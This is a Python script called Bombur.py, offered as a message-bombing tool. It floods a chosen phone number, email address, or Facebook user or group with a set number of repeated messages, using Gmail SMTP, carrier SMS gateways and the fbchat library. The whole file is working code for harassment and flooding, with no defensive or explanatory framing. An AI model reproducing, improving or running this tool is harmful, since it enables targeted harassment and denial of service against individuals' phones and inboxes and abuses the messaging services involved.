#! python3
__author__ = 'KattStof'
#Bombur.py - a simple email/sms/facebook bombing script
# One Script to rule them all
from colorama import Fore, init
import smtplib, getpass, time
from fbchat import Client
from fbchat.models import *
from GSMS import GSMS
init(convert=True)
print( Fore.YELLOW + """
 _______     ______   ___      ___  _______   ____  ____   _______   
|   _  "\   /    " \ |"  \    /"  ||   _  "\ ("  _||_ " | /"      \  
(. |_)  :) // ____  \ \   \  //   |(. |_)  :)|   (  ) : ||:        | 
|:     \/ /  /    ) :)/\\  \/.    ||:     \/ (:  |  | . )|_____/   ) 
(|  _  \\(: (____/ //|: \.        |(|  _  \\  \\ \__/ //  //      /  
|: |_)  :)\        / |.  \    /:  ||: |_)  :) /\\ __ //\ |:  __   \  
(_______/  \"_____/  |___|\__/|___|(_______/ (__________)|__|  \___) 
                                                                     """)
print(Fore.GREEN + '1) SMS Bomb')
print('2) E-mail Bomb')
print('3) Facebook Bomb')
choice = input("Enter Option: ")
if choice == '1':
    mailserver = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    mailserver.ehlo()
    username = input('Enter Gmail Email Address: ')
    password = getpass.getpass()
    print(' 1)AT&T \n 2)Verizon \n 3)T-Mobile \n 4)Sprint \n 5)VirginMobile \n 6)USCellular \n 7)Boost')
    carrier = input('Enter Phone Carrier: ')
    number = input('Enter Phone Number: ')
    texttosend = input("Messge to send: ")
    ammount = int(input('Number of texts to send: '))
    if carrier == '1':
        carrier = 'att'
    elif carrier == '2':
        carrier = 'verizon'
    elif carrier == '3':
        carrier = 'tmobile'
    elif carrier == '4':
        carrier = 'sprint'
    elif carrier == '5':
        carrier = 'virgin'
    elif carrier == '6':
        carrier = 'uscellular'
    elif carrier == '7':
        carrier = 'boost'
    for x in range(ammount):
        time.sleep(2)
        GSMS.sms(username, password, number,carrier,texttosend)
        print ('Sending text #', x + 1)
    print (str(ammount)," Text sent to " ,number, " successfully")
if choice == '2':
    mailserver = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    mailserver.ehlo()
    username = input('Enter Gmail Email Address: ')
    password = getpass.getpass()
    mailserver.login(username, password)
    from_email = input('Enter From Email: ')
    to_email = input('Enter Email Address To Bomb:')
    subject = input('Enter Email Subject: ')
    body = input('Enter Email Body: ')
    ammount = int(input('How Many Emails to send?: '))
    for i in range(ammount):
        print('Sending email #' + str(i + 1))
        time.sleep(2)
        mailserver.sendmail(from_email, to_email,'Subject:' + subject + '\n' + body)
    print(str(ammount),'Emails sent to', to_email, "successfully")
if choice == '3':
    fb_email = input('Enter Facebook Email ')
    fb_password = input('Enter Facebook Password ')
    client = Client(fb_email, fb_password)
    user_group = input('are you spamming user or group? ')
    if user_group.lower() == 'user':
        user_name = input('Name of user to spam ')
        users = client.searchForUsers(user_name)
        user = users[0]
        thread_id = user.uid
        message = input('What message to send ')
        ammount = int(input('How many messages to send '))
        for i in range(ammount):
            print('sending message #', i + 1)
            client.send(Message(text=message), thread_id=thread_id, thread_type=ThreadType.USER)
        print(str(ammount), ' messages sent to ', user_name, ' successfully' )
    if user_group.lower() == 'group':
        thread_id = input('Enter thread id ex: https://www.facebook.com/messages/t/xxxxx ')
        message = input('What message to send ')
        ammount = int(input('How many messages to send '))
        for i in range(ammount):
            print('sending message #', i + 1)
            client.send(Message(text=message), thread_id=thread_id, thread_type=ThreadType.GROUP)
        print(str(ammount), ' messgaes sent to group successfully ')
